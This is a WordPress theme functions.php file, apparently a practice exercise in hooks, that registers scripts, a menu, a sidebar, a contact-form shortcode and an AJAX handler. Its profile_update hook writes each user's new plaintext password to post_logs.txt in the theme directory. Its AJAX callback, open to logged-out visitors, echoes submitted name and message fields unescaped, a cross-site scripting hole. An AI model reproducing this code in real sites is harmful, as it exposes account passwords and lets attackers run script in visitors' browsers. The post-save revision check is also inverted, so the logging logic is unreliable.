<?php
/**
 * Enqueue scripts.
 */
function customized_theme_scripts()
{
    // styles
    wp_enqueue_style("bootstrap-css", get_template_directory_uri() . "/css/bootstrap.min.css", '', "4.5.2");
    //scripts
    wp_enqueue_script("jquery-js", get_template_directory_uri() . "/js/jquery.min.js", "", "3.5.1");
    wp_enqueue_script("popper-js", get_template_directory_uri() . "/js/popper.min.js", '', "1.16.0");
    wp_enqueue_script("bootstrap-js", get_template_directory_uri() . "/js/bootstrap.min.js", '', "4.5.2");
    wp_enqueue_script("custom-form-js", get_template_directory_uri() . "/js/custom-form-js.js", '', "1");
    $myData = array(
        'ajaxurl' => admin_url( 'admin-ajax.php' ),
    );
    wp_localize_script( "custom-form-js", "my_ajax_url", $myData );
}
add_action("wp_enqueue_scripts", "customized_theme_scripts");

/**
 * Add a Menu.
 */
function customized_theme_menus()
{

    register_nav_menus(array(
        "header" => "Header Menu"
    ));
}

add_action("init", "customized_theme_menus");

/**
 * Add a sidebar.
 */
function wpdocs_theme_slug_widgets_init()
{
    register_sidebar(array(
        'name' => "Right Sidebar",
        'id' => 'right-sidebar',
        'description' => "This is my right sidebar",
        'before_widget' => '<ul>',
        'after_widget' => '</ul>',
        'before_title' => '<h2>',
        'after_title' => '</h2>',
    ));
}

add_action('widgets_init', 'wpdocs_theme_slug_widgets_init');

/**************** Practice of hooks *********************/

add_action('save_post', function ($post_id) {
    if (!(wp_is_post_revision($post_id)) || wp_is_post_autosave($post_id)) {
        return '';
    }
    $post_logs = get_stylesheet_directory() . '/post_logs.txt';
    $message = apply_filters('change_log_message', get_the_title($post_id) . ' was just saved');

    if (file_exists($post_logs)) {
        $file = fopen($post_logs, "a");
        fwrite($file, $message . "\n");
        fclose($file);
    }
});

add_filter('change_log_message', function ($message) {
    $message = $message . ' - ' . date('F j, Y, g:i a');
    return $message;
});

add_action('template_redirect', function () {
    if (is_page('contact') && !is_user_logged_in()) {
        do_action('user_redirected', date('F j, Y, g:i a'));
        wp_redirect(home_url());
    }
});

add_action('user_redirected', function ($date) {

    $access_logs = get_stylesheet_directory() . '/post_logs.txt';
    $message = 'Some one tried to access the contact page on ' . $date;
    if (file_exists($access_logs)) {
        $file = fopen($access_logs, "a");
        fwrite($file, $message . "\n");
    } else {
        $file = fopen($access_logs, "w");
        fwrite($file, $message . "\n");
    }
    fclose($file);
});

add_action('profile_update', function ($user_id) {
    $access_logs = get_stylesheet_directory() . '/post_logs.txt';
    $file = fopen($access_logs, "a");
    fwrite($file, print_r($_POST['pass1'], true) . "\n");
}, 10, 2);

add_shortcode('form', function () {
    ob_start();
    ?>
    <div class="card">
        <div class="card-body">
            <form method="post" id="form" class="needs-validation" novalidate>
                <div class="form-group">
                    <label for="name">Name:</label>
                    <input type="text" class="form-control" id="name" placeholder="Enter name" name="name" required>
                    <div class="valid-feedback">Valid.</div>
                    <div class="invalid-feedback">Please fill out this field.</div>
                </div>
                <div class="form-group">
                    <label for="message">Message:</label>
                    <input type="text" class="form-control" id="message" placeholder="Enter message" name="message"
                           required>
                    <div class="valid-feedback">Valid.</div>
                    <div class="invalid-feedback">Please fill out this field.</div>
                </div>
                <button type="submit" class="btn btn-primary submit_bttn">Submit</button>
            </form>
        </div>
    </div>
    <?php
    $output = ob_get_contents();
    ob_end_clean();
    return $output;
});

add_action( 'wp_ajax_my_ajax_action', 'my_ajax_callback' );
add_action( 'wp_ajax_nopriv_my_ajax_action', 'my_ajax_callback' );
/**
 * Ajax Callback
 */
function my_ajax_callback(){
    $name = isset( $_POST['name'] ) ? $_POST['name'] : 'N/A';
    $message = isset( $_POST['message'] ) ? $_POST['message'] : 'N/A';
    ?>
    <p>Hello. Your Name is <?php echo $name; ?>.</p>
    <p>And your Message name is <?php echo $message; ?>.</p>
    <?php
    wp_die(); // required. to end AJAX request.
}

